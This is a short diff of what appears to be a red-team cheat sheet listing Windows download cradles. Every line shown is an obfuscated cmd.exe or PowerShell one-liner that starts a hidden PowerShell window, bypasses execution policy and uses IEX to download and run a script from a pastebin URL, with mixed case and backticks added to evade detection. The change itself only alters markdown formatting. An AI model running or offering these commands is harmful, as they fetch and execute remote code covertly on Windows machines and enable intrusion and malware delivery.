@@ -1,6 +1,6 @@
 # Not proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe)  
 # Windows Command Shell download cradles, not proxy aware ligthly obfuscated 
-cmd> c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"https://pastebin.com/raw/88SGrHVh\")"
+**cmd>** c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"https://pastebin.com/raw/88SGrHVh\")"
 cmd> PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNdOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"https://pastebin.com/raw/88SGrHVh\")"
 cmd> POWErshelL  -NoPRofi -WiNdoWSTYL  hidd -EXecUTiOnPO BYpASS -cO  "i`EX (    neW-o`BJE`cT N`ET.`weBcl`IeNT    ).\"do`wnLO`ADS`TRinG\"(    \"https://pastebin.com/raw/88SGrHVh\"   )"
 
